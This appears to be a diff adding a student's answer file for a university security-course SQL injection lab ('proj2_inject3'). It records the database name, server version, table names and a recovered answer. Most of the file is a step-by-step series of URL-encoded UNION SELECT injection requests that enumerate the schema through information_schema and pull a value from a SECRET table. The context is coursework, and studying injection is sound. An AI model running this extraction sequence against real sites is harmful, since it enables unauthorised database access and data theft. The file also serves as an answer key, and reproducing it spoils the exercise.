@@ -1,0 +1,17 @@
+proj2_inject3
+5.5.60-0ubuntu0.14.04.1
+HINT,SECRET,foo,inject3_users
+stapes
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=x%27+UNION+SELECT+1%2C2%2C3%2Cdatabase%28%29+--+
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=x%27+UNION+SELECT+1%2C2%2C3%2C%40%40version+--+
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=x%27+UNION+SELECT+1%2C2%2C3%2Ctable_name+FROM+information_schema.tables+WHERE+table_schema+%3D+%27proj2_inject3%27+--+
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=x%27+UNION+SELECT+1%2C2%2C3%2Ctable_name+FROM+information_schema.tables+WHERE+table_schema+%3D+%27proj2_inject3%27+LIMIT+1%2C1+--+
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=x%27+UNION+SELECT+1%2C2%2C3%2Ctable_name+FROM+information_schema.tables+WHERE+table_schema+%3D+%27proj2_inject3%27+LIMIT+2%2C1+--+
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=x%27+UNION+SELECT+1%2C2%2C3%2Ctable_name+FROM+information_schema.tables+WHERE+table_schema+%3D+%27proj2_inject3%27+LIMIT+3%2C1+--+
+
+
+
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=x%27+UNION+SELECT+1%2Ctable_name%2C3%2Ccolumn_name+FROM+information_schema.columns+WHERE+table_schema+%3D+%27proj2_inject3%27+LIMIT+1%2C1+--+
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=x%27+UNION+SELECT+1%2Ctable_name%2C3%2Ccolumn_name+FROM+information_schema.columns+WHERE+table_schema+%3D+%27proj2_inject3%27+LIMIT+4%2C1+--+
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=x%27+UNION+SELECT+1%2Ctable_name%2C3%2Ccolumn_name+FROM+information_schema.columns+WHERE+table_schema+%3D+%27proj2_inject3%27+LIMIT+3%2C1+--+
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=x%27+UNION+SELECT+1%2C2%2C3%2Csecret+FROM+SECRET+WHERE+id+%3D%27159%27+--+
